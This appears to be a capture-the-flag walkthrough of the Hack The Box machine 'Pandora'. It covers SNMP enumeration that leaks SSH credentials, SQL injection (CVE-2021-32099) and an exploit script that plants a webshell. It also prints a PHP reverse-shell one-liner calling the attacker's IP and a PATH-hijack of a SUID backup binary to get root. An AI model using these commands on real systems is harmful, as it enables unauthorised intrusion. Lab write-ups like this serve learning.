## Enumeration

### NMAP

```console
❯ nmap -sV -Pn 10.10.11.136
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-17 13:20 EDT
Nmap scan report for Panda.HTB (10.10.11.136)
Host is up (0.15s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 
80/tcp open http Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.79 seconds
```
> We see port 80 and 22 are open, so we have to go to the website.

### Domain

When we enter to the website this is what we see:

![panda.htb](web.png) 
_We add the domain \_panda.htb\_ on hosts file and enter to the website_


### NMAP

I come back to `nmap` because I tried to find subdomains or directories with `knock` and `ffuf`, but found nothing. This time I use an UDP scan.

```console
❯ sudo nmap -sU -top-ports=20 --open panda.htb
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-17 13:53 EDT
Nmap scan report for panda.htb (10.10.11.136)
Host is up (0.061s latency).
rDNS record for 10.10.11.136: Panda.HTB
Not shown: 13 closed udp ports (port-unreach)
PORT STATE SERVICE
123/udp open|filtered ntp
161/udp open snmp
162/udp open|filtered snmptrap
631/udp open|filtered ipp
1900/udp open|filtered upnp
4500/udp open|filtered nat-t-ike
49152/udp open|filtered unknown

Nmap done: 1 IP address (1 host up) scanned in 7.90 seconds
```

> So many ports **open\|filtered** but only one **open**, this is the snmp port.

Let's look at some information about that port.

```console
❯ sudo nmap -sU -sV -p 161 panda.htb
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-17 14:01 EDT
Nmap scan report for panda.htb (10.10.11.136)
Host is up (0.059s latency).
rDNS record for 10.10.11.136: Panda.HTB

PORT STATE SERVICE VERSION
161/udp open snmp SNMPv1 server; net-snmp SNMPv3 server (public)
Service Info: Host: pandora

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1.45 seconds
```

> We need to remember `public` because it is the community string.

### SNMP

Investigating a little bit I found a tool in this [website](https://pentesting.one2bla.me/enumeration/service-enumeration) called `snmpwalk`.

```
snmpwalk -c public -v1 panda.htb | tee snmpwalk1
```

Now let's see the `snmpwalk1` file.

```
...
iso.3.6.1.2.1.25.4.2.1.5.876 = STRING: "-c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23'"
iso.3.6.1.2.1.25.4.2.1.5.880 = STRING: "-f"
...
```
{: file="./snmpwalk1" }

> Ohhh, we see an user and a password here!

## Foothold

### SSH 

The latest credentials seems to work for the ssh, let's try:

```console
❯ ssh daniel@10.10.11.136
daniel@10.10.11.136's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)

...

daniel@pandora:~$
```

> And... we are in!

The first thing is an nmap to discover what services are running in here:

```console
daniel@pandora:~$ nmap localhost
Starting Nmap 7.80 ( https://nmap.org ) at 2022-05-17 18:41 UTC
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000059s latency).
Other addresses for localhost (not scanned): ::1
rDNS record for 127.0.0.1: localhost.localdomain
Not shown: 997 closed ports
PORT STATE SERVICE
22/tcp open ssh
80/tcp open http
3306/tcp open mysql

Nmap done: 1 IP address (1 host up) scanned in 0.05 seconds
```

> There is a website and a database in here...

Taking a look at the configuration of the website can also be helpful:

```console
daniel@pandora:~$ cat /etc/apache2/sites-enabled/pandora.conf 
<VirtualHost localhost:80>
  ServerAdmin admin@panda.htb
  ServerName pandora.panda.htb
  DocumentRoot /var/www/pandora
  AssignUserID matt matt
  <Directory /var/www/pandora>
    AllowOverride All
  </Directory>
  ErrorLog /var/log/apache2/error.log
  CustomLog /var/log/apache2/access.log combined
</VirtualHost>
```

> There seems to be an user called matt:

```console
daniel@pandora:~$ ls /home/matt/
tar user.txt
daniel@pandora:~$ cat /home/matt/user.txt 
cat: /home/matt/user.txt: Permission denied
```

> In matt home we see the FLAG user!

### Port_forwarding

We need to see that website on a browser, so let's do port forwarding with ssh.

In order to do this we need to follow the following command: \
`ssh -L local_port:dest_server_ip:remote_port ssh_server_hostname`

For this case, it is like this: \
`ssh -L 8080:localhost:80 daniel@10.10.11.136`

Now we can see the website in our browser.

### Vulnerability

Searching for PandoraFMS I found this SQL injection vulnerability:
* [CVE-2021-32099](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-32099): A SQL injection vulnerability in the pandora_console component of Artica Pandora FMS 742 allows an unauthenticated attacker to upgrade his unprivileged session via the /include/chart_generator.php session_id parameter, leading to a login bypass. 

Let's try this with sqlmap:

```

```

> I changed this table too, we just need to focus on admin and matt user.

### Matt access

I tried with admin session but it didn't work. Now changing session_id to g4e01qdgk36mfdh90hvcc54umq we enter like matt.

![matt](matt.png) 
_matt session_

Hmmm, if there is any way to upload files, we can upload a reverse shell to get access to the system.

There is not any fast method to get this working but... Searching for a script to do that I found this [one](https://raw.githubusercontent.com/shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticated/master/sqlpwn.py).

This script is able to get us an admin session_id and upload a webshell, but it is giving me some problems.

```console
❯ python exploit.py -t 127.0.0.1:8080 -f shell.php
URL: http://127.0.0.1:8080/pandora_console
[+] Sending Injection Payload
[+] Requesting Session
[+] Admin Session Cookie : 7pcmj1a43s35m1u6903br8213a
[+] Sending Payload 
[+] Respose : 200
[+] Pwned :)
```

> We are IN!

### Admin access

Well, now, we need to get a bash shell... After searching for a long time to get one I aam not able to do, so let's get into admin session on the website. 

Ok, it works!

![admin](admin.png) 
_admin session_

### Reverse shell

Now that we are admin, we can upload files. We just search for a working webshell like [this](https://raw.githubusercontent.com/JohnTroony/php-webshells/master/Collection/Simple-Webshell.php), download and upload to the system.

![webshell](webshell.png) 
_webshell uploaded_

> This is going well...

Finally, I get a bash shell with `nc -lnvp <port>` listening in my case 9042 port, and executing on the web shell this:

```php
php -r '$sock=fsockopen("10.10.16.40",9042);exec("/bin/bash -i <&3 >&3 2>&3");'
```

Is time to look into binaries with suid set. We just do 
`find / -perm -u=s -type f 2>/dev/null` and we see **/usr/bin/at** on the list. So let's go to [gtfobins](https://gtfobins.github.io/#) and look for _at_.

We see with `echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | at now; tail -f /dev/null` we can get a unrestricted shell. Let's try...

```console
❯ nc -lnvp 9042
listening on [any] 9042 ...
connect to [10.10.16.40] from (UNKNOWN) [10.10.11.136] 58356
bash: cannot set terminal process group (820): Inappropriate ioctl for device
bash: no job control in this shell
matt@pandora:/var/www/pandora/pandora_console/images$ echo "/bin/bash <$(tty) >$(tty) 2>$(tty)" | sudo /usr/bin/at now; tail -f /dev/null
<2>$(tty)" | sudo /usr/bin/at now; tail -f /dev/null  
sudo: PERM_ROOT: setresuid(0, -1, -1): Operation not permitted
sudo: unable to initialize policy plugin
bash: [12152: 1 (255)] tcsetattr: Inappropriate ioctl for device*-
```

> This is not working...

### Exploit

There's other interesting binary called **pandora_backup** and have SUID bit.

When we execute it, it gives us:

```console
tar: /root/.backup/pandora-backup.tar.gz: Cannot open: Permission denied
PandoraFMS Backup Utility
Now attempting to backup PandoraFMS client
Backup failed!
Check your permissions!
```

In order to fix this, I create an executable "tar", and then add the path of this executable. 

```console
matt@pandora:~$ echo "/bin/bash" > tar
matt@pandora:~$ chmod +x tar
matt@pandora:~$ export PATH=$(pwd):$PATH
matt@pandora:~$ /usr/bin/pandora_backup 
PandoraFMS Backup Utility
Now attempting to backup PandoraFMS client
root@pandora:~#
```

> I really need help in this part, and I also need to move netcat to ssh because the shell was blocking everything from me...

## NC to SSH

This is how it is done: 

```
**netcat**
$ ssh-keygen -t rsa
$ cat id_rsa.pub > authorized_keys
**our machine**
# copy the content of id_rsa
$ ssh -i id_rsa matt@10.10.11.136
```

## CONCLUSION

This machine is much more difficult than Paper. The shell was giving me many problems, and I wasted a lot of time on that. My solution possibly is not the easiest one, but I'm still learning and gettin better.
